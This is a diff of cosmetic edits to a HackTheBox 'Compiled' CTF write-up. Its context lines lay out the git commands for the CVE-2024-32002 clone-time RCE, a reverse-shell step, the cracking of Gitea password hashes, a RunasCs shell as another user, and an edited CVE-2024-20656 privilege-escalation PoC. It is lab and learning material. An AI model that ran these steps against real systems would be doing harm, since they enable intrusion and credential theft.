@@ -1,6 +1,7 @@
 ---
-title: "[HTB] Compiled: 07/29/24"
+title: "[HTB] Compiled"
 type: docs
+date: 2024-07-30T12:00:00Z
 prev: docs/cybersecurity/hackthebox
 ---
 
@@ -54,7 +55,7 @@ eyewitness -f compiled_sites.txt
 
 Upon visiting the sites, we observe:
 
-| ![Gitea](/images/hackthebox/compiled/Gitea_home.png) | ![Compiled](/images/hackthebox/compiled/compiled_home.png) |
+| ![Gitea](/images/hackthebox/compiled/gitea_home.png) | ![Compiled](/images/hackthebox/compiled/compiled_home.png) |
 | :----------------------------------------------------------: | :-------------------------------------------------------------: |
 | *Gitea Site*                                                 | *Custom Web App called 'Compiled'*                              |
 
@@ -108,7 +109,7 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
 ```
 
-Initially, thoughts of path traversal, LFI, or filter bypassing crossed my mind, as did getting a shell to compile and then be run since the website states that we can "view our results," implying that there may be some form of execution. None of these paths seemed promising after some probing. Searching for "git compile RCE," we find a promising, recent post titled "Exploiting CVE-2024-32002: RCE via git clone" (https://amalmurali.me/posts/git-rce/).
+Initially, thoughts of path traversal, LFI, or filter bypassing crossed my mind, as did getting a shell to compile and then be run since the website states that we can "view our results," implying that there may be some form of execution. None of these paths seemed promising after some probing. Searching for "git compile RCE," we find a promising, recent post titled "[Exploiting CVE-2024-32002: RCE via git clone] (https://amalmurali.me/posts/git-rce/)".
 
 ## Foothold
 
@@ -145,7 +146,7 @@ git config --global init.defaultBranch main
 *payload here*
 ```
 
-We chose to use the PowerShell Base64 encoded payload from `revshells.com`.
+I chose to use the PowerShell Base64 encoded payload from `revshells.com`.
 
 4. Make the newly created file executable:
 
@@ -173,39 +174,39 @@ git update-index --index-info < index.info
 
 This is the crux of the exploit, let's break it down a bit:
 
-(a) Create a file named `dotgit.txt` containing the string `.git`:
+    (a) Create a file named `dotgit.txt` containing the string `.git`:
 
-```bash
-printf ".git" > dotgit.txt
-```
+    ```bash
+    printf ".git" > dotgit.txt
+    ```
 
-This command writes the string `.git` to a file named `dotgit.txt`. This file will be used in the next step to generate a Git object.
+    This command writes the string `.git` to a file named `dotgit.txt`. This file will be used in the next step to generate a Git object.
 
-(b) Generate a Git hash object from the contents of `dotgit.txt`:
+    (b) Generate a Git hash object from the contents of `dotgit.txt`:
 
-```bash
-git hash-object -w --stdin < dotgit.txt > dot-git.hash
-```
+    ```bash
+    git hash-object -w --stdin < dotgit.txt > dot-git.hash
+    ```
 
-Here, the `git hash-object` command reads the contents of `dotgit.txt` and creates a Git blob object. The `-w` flag writes this object to the Git object database, and the resulting hash is saved in the file `dot-git.hash`.
+    Here, the `git hash-object` command reads the contents of `dotgit.txt` and creates a Git blob object. The `-w` flag writes this object to the Git object database, and the resulting hash is saved in the file `dot-git.hash`.
 
-(c) Prepare an index entry for the Git submodule with the symlink pointing to the `.git` directory:
+    (c) Prepare an index entry for the Git submodule with the symlink pointing to the `.git` directory:
 
-```bash
-printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
-```
+    ```bash
+    printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
+    ```
 
-This command formats a string with the appropriate Git index entry for a symlink. The mode `120000` indicates a symlink, and the hash of the object created in the previous step is inserted into the string. The result is saved to `index.info`.
+    This command formats a string with the appropriate Git index entry for a symlink. The mode `120000` indicates a symlink, and the hash of the object created in the previous step is inserted into the string. The result is saved to `index.info`.
 
-(d) Update the Git index with the new entry from `index.info`:
+    (d) Update the Git index with the new entry from `index.info`:
 
-```bash
-git update-index --index-info < index.info
-```
+    ```bash
+    git update-index --index-info < index.info
+    ```
 
-Finally, the `git update-index` command reads the formatted string from `index.info` and updates the Git index with this new entry. This effectively adds a symlink in the repository that points to the `.git` directory of the submodule.
+    Finally, the `git update-index` command reads the formatted string from `index.info` and updates the Git index with this new entry. This effectively adds a symlink in the repository that points to the `.git` directory of the submodule.
 
-By creating a symlink to the `.git` directory, this setup can trick the victim into executing malicious hooks or commands when they interact with the repository. This specific manipulation allows the attacker to execute code on the victim's machine when the repository is cloned and checked out, leveraging Git's behavior with submodules and symlinks.
+    By creating a symlink to the `.git` directory, this setup can trick the victim into executing malicious hooks or commands when they interact with the repository. This specific manipulation allows the attacker to execute code on the victim's machine when the repository is cloned and checked out, leveraging Git's behavior with submodules and symlinks.
 
 4. Commit this and push the changes.
 
@@ -252,7 +253,7 @@ sqlite> select * from user;
 6|temp|temp||temp@temp.com|0|enabled|716e816c94cd603e6290e3ae6ecd275093c8a690a6668af1d987609df488a353f579bbaf25cec44ab1ca6483a8fff6fc8d71|pbkdf2$50000$50|0|0|0||0|||3da88239bd34cf2d6a4d43be87140843|ddd92ee4843aa73505ac9ed103f70c25|en-US||1722146269|1722146337|1722146269|0|-1|1|0|0|0|0|1|0||temp@temp.com|0|0|0|0|2|0|0|0|0||arc-green|0
 ```
 
-To crack these hashes, we convert them to base64. The hash and the salt to base64, giving us the hashes that look like:
+To crack these hashes, we convert the hash and the salt to base64, giving us the hashes that look like:
 
 ```
 sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=
@@ -272,13 +273,13 @@ sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka
 
 as Emily's password. Emily cannot log in remotely, so we use `RunasCs.exe` to catch a shell as Emily from our non-interactive shell.
 
-```powershell
+```bash
 .\RunasCs.exe Emily 12345679 powershell -r ip:port
 ```
 
 ## Privilege Escalation
 
-After some enumeration, we find the `VSStandardCollectorService150` service. Searching the internet yields another recent CVE for LPE (https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/). The PoC widely available (https://github.com/Wh04m1001/CVE-2024-20656) needs a few small edits, namely to change the MS VSCode version in line 4 to match the appropriate date:
+After some enumeration, we find the `VSStandardCollectorService150` service. Searching the internet yields another recent [CVE for LPE] (https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/). The [PoC widely available] (https://github.com/Wh04m1001/CVE-2024-20656) needs a few small edits, namely to change the MS VSCode version in line 4 to match the appropriate date:
 
 ```c
 WCHAR cmd[] = L"C:\\Program Files\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";
